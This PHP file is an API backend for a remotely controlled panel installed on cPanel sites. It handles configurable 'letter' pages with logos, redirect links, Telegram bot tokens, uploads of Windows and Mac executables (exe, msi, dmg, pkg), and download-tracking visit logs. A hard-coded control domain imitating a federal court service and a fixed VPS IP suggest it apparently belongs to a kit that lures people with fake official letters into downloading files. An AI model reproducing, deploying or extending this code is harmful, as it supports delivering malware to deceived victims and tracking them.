<?php
// bot-api.php — Local API stub for HostPanel embedded dashboard
// This is the ONLY file needed on each cPanel (replaces the full admin-dashboard.php)
// All UI lives on HostPanel. This handles file I/O, uploads, and DB that must be local.

header('Cache-Control: no-store, no-cache, must-revalidate');
header('Content-Type: application/json');

// Auth: validate shared secret token from HostPanel
// Use getcwd() so we read from site_dir when called via proxy.php (which chdir's there)
// Fall back to __DIR__ for standalone (panelcou1999 self-requests)
$config_file = file_exists(getcwd() . '/bot-config.json')
    ? getcwd() . '/bot-config.json'
    : __DIR__ . '/bot-config.json';
$config = file_exists($config_file) ? (json_decode(file_get_contents($config_file), true) ?? []) : [];

// Secret key: stored in bot-config.json as 'panel_api_key', set by HostPanel on first deploy
$expected_key = $config['panel_api_key'] ?? '';
$provided_key = $_SERVER['HTTP_X_PANEL_KEY'] ?? ($_POST['_panel_key'] ?? '');

if (!$expected_key || !hash_equals($expected_key, $provided_key)) {
    http_response_code(403);
    echo json_encode(['ok' => false, 'error' => 'Unauthorized']);
    exit;
}

// Only allow requests from HostPanel origin
$origin = $_SERVER['HTTP_ORIGIN'] ?? $_SERVER['HTTP_REFERER'] ?? '';
$allowed_hosts = ['panel.courtfidral-services.online'];
$origin_ok = false;
foreach ($allowed_hosts as $h) {
    if (strpos($origin, $h) !== false) { $origin_ok = true; break; }
}
// Also allow from VPS IP (server-side proxy calls)
$caller_ip = $_SERVER['REMOTE_ADDR'] ?? '';
if ($caller_ip === '37.60.232.250') $origin_ok = true;
if (!$origin_ok) {
    http_response_code(403);
    echo json_encode(['ok' => false, 'error' => 'Origin not allowed']);
    exit;
}

$action = $_POST['action'] ?? $_GET['action'] ?? '';
$cf = __DIR__ . '/bot-config.json';
$lc_file = __DIR__ . '/letter-config.json';
$db_file = __DIR__ . '/visits.db';
$presets_file = __DIR__ . '/letter_presets.json';

// ── Config read/write ──────────────────────────────────────────────────────

if ($action === 'config_get') {
    $cfg = file_exists($cf) ? (json_decode(file_get_contents($cf), true) ?? []) : [];
    unset($cfg['panel_api_key']); // never expose
    echo json_encode(['ok' => true, 'config' => $cfg]);
    exit;
}

if ($action === 'config_save') {
    $data = json_decode(file_get_contents('php://input'), true) ?: [];
    $cfg = file_exists($cf) ? (json_decode(file_get_contents($cf), true) ?? []) : [];
    $allowed = [
        'bot_name','site_url','redirect_link','visits_bot_token','control_bot_token',
        'extra_users','mobile_logo','mobile_text','mobile_color','mobile_footer_color',
        'mobile_title','admin_chat_id','bot_username',
        'windows_link_id','windows_file_id','windows_file_name','windows_file_prefix',
        'windows_prefix_names','windows_download_link','windows_mode','windows_file_ext',
        'mac_link_id','mac_file_id','mac_file_name','mac_file_prefix',
        'mac_prefix_names','mac_download_link','mac_mode','mac_file_ext',
    ];
    foreach ($data as $k => $v) {
        if (in_array($k, $allowed)) $cfg[$k] = $v;
    }
    file_put_contents($cf, json_encode($cfg, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    echo json_encode(['ok' => true, 'msg' => 'Saved!']);
    exit;
}

if ($action === 'config_toggle') {
    $key = $_POST['key'] ?? '';
    $cfg = file_exists($cf) ? (json_decode(file_get_contents($cf), true) ?? []) : [];
    if (array_key_exists($key, $cfg) && is_bool($cfg[$key])) {
        $cfg[$key] = !$cfg[$key];
        file_put_contents($cf, json_encode($cfg, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    }
    echo json_encode(['ok' => true, 'value' => $cfg[$key] ?? false]);
    exit;
}

// ── Letter config ──────────────────────────────────────────────────────────

if ($action === 'letter_get') {
    $lc = file_exists($lc_file) ? (json_decode(file_get_contents($lc_file), true) ?? []) : [];
    echo json_encode(['ok' => true, 'letter' => $lc]);
    exit;
}

if ($action === 'letter_save') {
    $data = json_decode(file_get_contents('php://input'), true) ?: [];
    if (!empty($data['accent']) && !preg_match('/^#[0-9a-fA-F]{6}$/', $data['accent'])) $data['accent'] = '#1a3a6b';
    file_put_contents($lc_file, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    if (!empty($data['redirect_link'])) {
        $cfg = file_exists($cf) ? (json_decode(file_get_contents($cf), true) ?? []) : [];
        $cfg['redirect_link'] = $data['redirect_link'];
        file_put_contents($cf, json_encode($cfg, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    }
    echo json_encode(['ok' => true, 'msg' => 'Letter saved!']);
    exit;
}

// ── File management (uploads) ──────────────────────────────────────────────

if ($action === 'files_list') {
    $folder = in_array($_POST['folder'] ?? '', ['windows','mac']) ? $_POST['folder'] : 'windows';
    $dir = __DIR__ . '/uploads/' . $folder . '/';
    $res = [];
    $skip = ['logo.jpg','logo.jpeg','logo.png','logo.gif','logo.webp','logo.svg'];
    if (is_dir($dir)) {
        foreach (array_diff(scandir($dir), ['.','..', '.htaccess']) as $f) {
            if (is_file($dir.$f) && !in_array(strtolower($f), $skip))
                $res[] = ['name' => $f, 'size' => filesize($dir.$f), 'time' => filemtime($dir.$f)];
        }
    }
    echo json_encode(['ok' => true, 'files' => $res]);
    exit;
}

if ($action === 'file_delete') {
    $folder = in_array($_POST['folder'] ?? '', ['windows','mac']) ? $_POST['folder'] : 'windows';
    $fn = basename($_POST['file'] ?? '');
    $p  = __DIR__ . '/uploads/' . $folder . '/' . $fn;
    if ($fn && file_exists($p) && is_file($p)) { unlink($p); echo json_encode(['ok' => true]); }
    else echo json_encode(['ok' => false, 'msg' => 'Not found']);
    exit;
}

if ($action === 'files_delete_all') {
    $folder = in_array($_POST['folder'] ?? '', ['windows','mac']) ? $_POST['folder'] : 'windows';
    $dir = __DIR__ . '/uploads/' . $folder . '/';
    $skip = ['logo.jpg','logo.jpeg','logo.png','logo.gif','logo.webp','logo.svg','.htaccess'];
    $cnt = 0;
    if (is_dir($dir)) {
        foreach (array_diff(scandir($dir), ['.','..']) as $f) {
            if (is_file($dir.$f) && !in_array(strtolower($f), $skip)) { unlink($dir.$f); $cnt++; }
        }
    }
    echo json_encode(['ok' => true, 'deleted' => $cnt]);
    exit;
}

if ($action === 'file_upload') {
    $folder = in_array($_POST['folder'] ?? '', ['windows','mac']) ? $_POST['folder'] : 'windows';
    $dir = __DIR__ . '/uploads/' . $folder . '/';
    if (!is_dir($dir)) mkdir($dir, 0755, true);
    if (empty($_FILES['files'])) { echo json_encode(['ok' => false, 'msg' => 'No files']); exit; }
    $up = []; $er = [];
    $ae = ['exe','msi','zip','dmg','pkg','apk','rar','7z','tar','gz','pdf','txt'];
    $fa = $_FILES['files'];
    $cnt = is_array($fa['name']) ? count($fa['name']) : 1;
    for ($i = 0; $i < $cnt; $i++) {
        $nm = is_array($fa['name'])     ? $fa['name'][$i]     : $fa['name'];
        $tp = is_array($fa['tmp_name']) ? $fa['tmp_name'][$i] : $fa['tmp_name'];
        $e2 = is_array($fa['error'])    ? $fa['error'][$i]    : $fa['error'];
        $sz = is_array($fa['size'])     ? $fa['size'][$i]     : $fa['size'];
        if ($e2 !== 0) { $er[] = "$nm: upload error (code $e2)"; continue; }
        if ($sz > 500 * 1024 * 1024) { $er[] = "$nm: too large"; continue; }
        $ext = strtolower(pathinfo($nm, PATHINFO_EXTENSION));
        if ($ext === 'zip') {
            $z = new ZipArchive();
            if ($z->open($tp) === true) {
                $rdir = realpath($dir) . DIRECTORY_SEPARATOR;
                for ($j = 0; $j < $z->numFiles; $j++) {
                    $en = $z->getNameIndex($j);
                    if (substr($en, -1) === '/') continue;
                    $ee = strtolower(pathinfo($en, PATHINFO_EXTENSION));
                    if (!in_array($ee, $ae)) continue;
                    $b = basename($en);
                    if (!$b || $b === '.' || $b === '..') continue;
                    file_put_contents($rdir . $b, $z->getFromIndex($j));
                    $up[] = $b . ' (from ZIP)';
                }
                $z->close();
            } else $er[] = "$nm: bad ZIP";
        } elseif (in_array($ext, $ae)) {
            move_uploaded_file($tp, $dir . basename($nm));
            $up[] = basename($nm);
        } else $er[] = "$nm: type not allowed";
    }
    echo json_encode(['ok' => true, 'uploaded' => $up, 'errors' => $er]);
    exit;
}

// ── Logo upload ────────────────────────────────────────────────────────────

if ($action === 'logo_upload') {
    $type = in_array($_POST['type'] ?? '', ['mobile','letter']) ? $_POST['type'] : 'mobile';
    if (isset($_FILES['logo']) && $_FILES['logo']['error'] === 0) {
        if ($_FILES['logo']['size'] > 5 * 1024 * 1024) { echo json_encode(['ok'=>false,'msg'=>'Max 5MB']); exit; }
        $fi = new finfo(FILEINFO_MIME_TYPE);
        $mime = $fi->file($_FILES['logo']['tmp_name']);
        $al = ['image/jpeg'=>'jpg','image/png'=>'png','image/gif'=>'gif','image/webp'=>'webp'];
        if (!isset($al[$mime])) { echo json_encode(['ok'=>false,'msg'=>'Invalid type']); exit; }
        if (!is_dir(__DIR__.'/uploads/')) mkdir(__DIR__.'/uploads/', 0755, true);
        $dest = 'uploads/' . ($type === 'letter' ? 'letter-logo' : 'logo') . '.' . $al[$mime];
        move_uploaded_file($_FILES['logo']['tmp_name'], __DIR__.'/'.$dest);
        $url = $dest . '?v=' . time();
        if ($type === 'letter') {
            $lc = file_exists($lc_file) ? (json_decode(file_get_contents($lc_file), true) ?? []) : [];
            $lc['logo_url'] = $dest;
            file_put_contents($lc_file, json_encode($lc, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        } else {
            $cfg = file_exists($cf) ? (json_decode(file_get_contents($cf), true) ?? []) : [];
            $cfg['mobile_logo_url'] = $dest . '?v=' . time();
            file_put_contents($cf, json_encode($cfg, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        }
        echo json_encode(['ok' => true, 'url' => $url]);
    } else echo json_encode(['ok' => false, 'msg' => 'No file']);
    exit;
}

// ── Visits analytics ───────────────────────────────────────────────────────

if ($action === 'visits_get') {
    if (!file_exists($db_file) || !class_exists('SQLite3')) {
        echo json_encode(['ok' => true, 'visits' => [], 'total' => 0, 'downloads' => 0]);
        exit;
    }
    try {
        $db = new SQLite3($db_file, SQLITE3_OPEN_READONLY);
        $limit = intval($_POST['limit'] ?? 100);
        $offset = intval($_POST['offset'] ?? 0);
        $rows = [];
        $res = $db->query("SELECT * FROM visits ORDER BY created_at DESC LIMIT $limit OFFSET $offset");
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $rows[] = $row;
        $total   = $db->querySingle("SELECT COUNT(*) FROM visits");
        $dls     = $db->querySingle("SELECT COUNT(*) FROM visits WHERE action='download'");
        $db->close();
        echo json_encode(['ok' => true, 'visits' => $rows, 'total' => $total, 'downloads' => $dls]);
    } catch (Exception $e) {
        echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
    }
    exit;
}

// ── Presets (read from local letter_presets.json) ──────────────────────────

if ($action === 'presets_list') {
    $list = file_exists($presets_file) ? (json_decode(file_get_contents($presets_file), true) ?? []) : [];
    echo json_encode(['ok' => true, 'presets' => $list]);
    exit;
}

if ($action === 'preset_save') {
    $data = json_decode(file_get_contents('php://input'), true) ?: [];
    $list = file_exists($presets_file) ? (json_decode(file_get_contents($presets_file), true) ?? []) : [];
    $id   = preg_replace('/[^a-z0-9_]/', '', strtolower(trim($data['id'] ?? '')));
    if (!$id) { echo json_encode(['ok'=>false,'msg'=>'Invalid ID']); exit; }
    $idx = null;
    foreach ($list as $i => $pr) { if (($pr['id'] ?? '') === $id) { $idx = $i; break; } }
    if ($idx !== null) $list[$idx] = $data; else $list[] = $data;
    file_put_contents($presets_file, json_encode($list, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    echo json_encode(['ok' => true]);
    exit;
}

if ($action === 'preset_delete') {
    $id = trim($_POST['id'] ?? '');
    $list = file_exists($presets_file) ? (json_decode(file_get_contents($presets_file), true) ?? []) : [];
    $list = array_values(array_filter($list, fn($pr) => ($pr['id'] ?? '') !== $id));
    file_put_contents($presets_file, json_encode($list, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    echo json_encode(['ok' => true]);
    exit;
}

echo json_encode(['ok' => false, 'error' => 'Unknown action: ' . htmlspecialchars($action)]);
